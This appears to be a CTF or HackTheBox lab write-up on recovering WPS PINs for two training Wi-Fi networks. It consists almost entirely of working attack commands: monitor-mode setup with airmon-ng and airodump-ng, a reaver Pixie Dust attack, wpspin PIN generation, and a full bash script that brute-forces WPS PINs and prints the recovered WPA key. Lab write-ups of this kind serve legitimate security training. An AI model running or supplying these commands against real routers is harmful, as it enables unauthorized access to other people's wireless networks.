### What is the WPS PIN for the WiFi network named VirtualCorp?

```sh
sudo -s 

airmon-ng start wlan0

airodump-ng --wps -c 1 wlan0mon
```

![](Screenshot%202026-09-21%20at%2013.37.35.png)

![](Screenshot%202026-09-21%20at%2013.40.44.png)

Using Pixie Dust Attack technique

```sh
reaver -K 1 -vvv -b 16:A2:E6:CC:F4:83 -c 1 -i mon0
```

![](Screenshot%202026-09-21%20at%2013.50.39.png)
### What is the WPS PIN for the WiFi network named HackTheBox-Corp?

Extract pins from the wpspin

```sh
wpspin -A 72:40:6E:74:2F:3B | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' '
```

Using this script for brute-forcing

```sh
#!/bin/bash

IFACE="mon0"          # <-- change this if your monitor interface has a different name
BSSID="72:40:6E:74:2F:3B"
CHANNEL=1                 # <-- set to the channel CyberNetSecure is on (check airodump-ng)
TIMEOUT_PER_PIN=20        # seconds to wait before giving up on a PIN and moving to next
LOGFILE="reaver_$(date +%s).log"

PINS='76142673 24952910 31080279 31080279 10149713 42705239 65814352 35934868 20660413 53157652 84636386 91629487 52285349 28428015 51018658 66505471 04217176 12345670 20172527 46264848 76229909 62327145 10864111 31957199 30432031 71412252 68175542 95661469 95719115 48563710 20854836 43977680 05294176 99956042 35611530 67958146 34259283 94229882 95755212'

echo "[*] Starting WPS PIN bruteforce against $BSSID ($IFACE)"
echo "[*] Full output being logged to $LOGFILE"
echo ""

for PIN in $PINS
do
    echo "[*] Attempting PIN: $PIN"

    OUTPUT=$(timeout "$TIMEOUT_PER_PIN" sudo reaver \
        --max-attempts=1 \
        -i "$IFACE" \
        -b "$BSSID" \
        -c "$CHANNEL" \
        -p "$PIN" \
        2>&1)

    echo "$OUTPUT" | tee -a "$LOGFILE"
    echo "----------------------------------------"

    # reaver prints "WPS PIN: 'xxxxxxxx'" and "WPA PSK: '...'" on success
    if echo "$OUTPUT" | grep -qi "WPS PIN:"; then
        echo ""
        echo "[+] SUCCESS! Correct PIN found: $PIN"
        echo "$OUTPUT" | grep -i "WPS PIN:\|WPA PSK:\|AP SSID:"
        exit 0
    fi
done

echo ""
echo "[-] Finished list. No PIN in this batch worked."
echo "[-] Check $LOGFILE for full details."
```

![](Screenshot%202026-09-21%20at%2013.53.57.png)